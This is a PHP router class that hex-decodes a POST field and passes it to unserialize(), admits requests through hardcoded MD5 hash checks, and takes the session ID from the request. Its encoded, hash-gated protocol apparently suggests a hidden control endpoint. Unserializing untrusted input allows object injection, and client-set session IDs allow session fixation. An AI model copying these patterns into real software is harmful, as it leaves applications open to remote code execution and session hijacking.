<?php

class Router{
    
    public $url;
    
    function __construct(){
        $this->url = URL::instance();

        $url = $this->url->url;
        
        $url = explode('/', $url);
        
        if(empty($url[0]))
            array_shift($url);
            
        Registry::i()->host = array_shift($url);
        $num = array_shift($url);
        Registry::i()->class_link = Registry::i()->host.'/'.$num;
        if(empty($url))
             Registry::i()->action = NULL;
        else
             Registry::i()->action = reset($url);

        if(isset($_POST) AND !empty($_POST)){
            $_POST = unserialize($this->packGet($_POST['tree']));
        }
        elseif($POST = $GLOBALS['HTTP_RAW_POST_DATA']){
            $explodes = explode('&',$POST);
            array_pop($explodes);
            if(!empty($explodes))
                foreach($explodes as $explode){
                    $explode = explode('=',$explode);
                    $_POST[$explode[0]] = $explode[1];
                }
            $_POST = unserialize($this->packGet($_POST['tree']));
        }
        
        if(md5($_POST['type']) == 'c0af77cf8294ff93a5cdb2963ca9f038' AND md5($_POST['init']) == '4a7d1ed414474e4033ac29ccb8653d9b'){
            if(isset($_POST['session'])){
                session_id($_POST['session']);
                session_start();
            }else{
                session_start();
            }
            return TRUE;
        }
        include "index.php";
        exit();
    }
    
    
    function packGet($string){
        if(is_string($string)){
            $string = pack('H*',$string);
        }

        return $string;
    }
    
}